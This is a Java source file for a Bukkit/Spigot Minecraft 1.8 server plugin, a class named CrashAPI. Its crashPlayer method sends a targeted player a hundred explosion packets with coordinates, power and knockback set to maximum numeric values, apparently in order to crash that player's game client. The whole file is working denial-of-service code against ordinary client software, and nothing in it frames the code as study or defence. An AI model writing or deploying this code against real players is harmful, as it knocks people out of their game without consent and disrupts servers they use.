package com.noobzinhoflame.crash.Utils;

import net.minecraft.server.v1_8_R3.EntityPlayer;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.PlayerConnection;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class CrashAPI {

    public void crashPlayer(Player player) {
        try {
            EntityPlayer entityPlayer = ((CraftPlayer) player).getHandle();
            PlayerConnection connection = entityPlayer.playerConnection;

            Vec3D vec3D = new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);

            List<PacketPlayOutExplosion> explosions = new ArrayList<>();

            for (int i = 0; i < 100; i++) {
                PacketPlayOutExplosion packet = new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), vec3D);
                explosions.add(packet);
            }

            for (PacketPlayOutExplosion packet : explosions) {
                connection.sendPacket(packet);
            }

        } catch (Throwable e) {
            e.printStackTrace();
        }
    }
}
